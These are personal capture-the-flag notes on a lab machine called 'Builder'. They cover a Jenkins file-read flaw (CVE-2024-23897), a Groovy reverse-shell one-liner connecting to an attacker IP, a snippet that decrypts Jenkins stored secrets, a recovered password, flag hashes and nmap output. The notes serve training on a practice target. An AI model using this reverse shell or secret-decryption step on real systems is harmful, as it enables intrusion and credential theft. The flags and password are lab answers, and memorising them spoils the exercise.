# Builder \[Medium]

{% embed url="https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa" %}

## Report

Jenkins 2.441 is vulnerable to unauthenticated file disclosure via CVE-2024-23897, use it to read credentials of user 'jennifer'. Obtain reverse shell via groovy script and fetch root SSH key stored in credentials.xml in encrypted form. Decrypt and SSH via root

## Cheatsheet

```
Jenkins 2.441
┌──(jtripz㉿kali)-[~/htb/rooms/builder/CVE-2024-23897]
└─$ python3 jenkins_fileread.py -u http://10.10.11.10:8080

CHECK THE ENVIRONMENT VARIABLES
/proc/self/environ

JENKINS_HOME=/var/jenkins_home
/var/jenkins_home/users/jennifer_12108429903186576833/config.xml

#Groovy revshell same as Jeeves
String host="10.10.14.15";int port=9002;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close()

/var/jenkins_home/credentials.xml
println(hudson.util.Secret.fromString("{XXX=}").getPlainText())
#Get root id_rsa and use it via SSH 
```

## Loot

### Creds

```
jennifer:princess
fd30af54bea6585b923768f92989f6bd - user.txt
32146ecd5bcf782b4fe7a074f0235e43 - root.txt
```

### Enum

```
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Dashboard [Jenkins]
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ubuntu where is the config file
```
